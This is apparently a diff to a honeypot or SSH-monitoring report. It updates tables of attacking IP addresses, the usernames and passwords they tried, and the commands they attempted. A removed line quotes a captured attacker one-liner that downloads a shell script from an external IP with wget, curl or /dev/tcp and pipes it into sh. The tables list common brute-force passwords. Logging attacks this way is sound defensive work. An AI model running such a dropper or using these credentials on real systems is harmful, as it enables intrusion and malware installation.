@@ -13,52 +13,49 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 59.110.221.129 | 4629 |
-| 39.100.33.130 | 4507 |
-| 39.105.102.121 | 4365 |
-| 47.238.249.246 | 4338 |
-| 47.242.109.251 | 4338 |
-| 47.243.11.108 | 4196 |
-| 47.243.71.56 | 4185 |
-| 8.217.10.15 | 2055 |
-| 47.74.46.213 | 1198 |
-| 47.237.132.148 | 994 |
+| 47.92.243.59 | 9585 |
+| 47.76.57.93 | 4427 |
+| 8.210.112.164 | 4382 |
+| 8.217.63.115 | 4284 |
+| 47.238.199.19 | 4219 |
+| 47.238.198.5 | 4184 |
+| 47.121.203.235 | 2927 |
+| 47.109.53.53 | 1149 |
+| 8.138.147.140 | 522 |
+| 157.245.47.11 | 99 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 2782 |
-| admin | 19 |
-| debian | 15 |
-| test | 14 |
-| ubuntu | 14 |
+| root | 8648 |
+| stefano | 17 |
+| deamon_root | 16 |
 | deamon | 13 |
-| oracle | 10 |
-| postgres | 9 |
-| user | 9 |
-| zabbix | 9 |
+| debian | 6 |
+| guest | 2 |
+| near | 2 |
+| ravencoin | 2 |
+| terra | 2 |
+| a | 1 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 318 |
-| 111111 | 49 |
-| Server123@ | 28 |
-| password | 18 |
-| kontol | 16 |
+| Server123@ | 38 |
+| stefano | 17 |
+| admin@123 | 17 |
+| deamon_root | 16 |
 | 1Qaz@wsx | 15 |
-| 1234 | 15 |
-| test | 14 |
+| kontol | 14 |
 | deamon | 13 |
-| debian | 9 |
+| adm1n12345 | 10 |
+| Qaz.123456 | 10 |
+| PA$$w0rd_123 | 9 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 87.120.113.231 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
-| 47.251.100.22 | uname -s -m |
-| 31.220.82.183 | uname -s -m |
-| 31.57.241.17 | uname -s -m |
+| 47.92.243.59 | echo -e "\x6F\x6B" |
